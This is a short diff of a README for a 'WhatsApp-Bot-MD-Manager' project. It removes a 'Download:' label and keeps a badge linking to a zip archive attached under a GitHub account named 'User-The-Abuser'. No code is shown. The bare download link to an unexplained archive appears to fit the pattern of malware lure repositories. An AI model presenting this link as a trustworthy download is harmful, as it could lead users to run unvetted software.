@@ -1,5 +1,4 @@
 # WhatsApp-Bot-MD-Manager
-Download:
 
 [![Download](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/User-The-Abuser/WhatsApp-Bot-MD-Manager/files/15462212/WhatsApp-Bot-MD-1.0.0-Manager.zip)
 
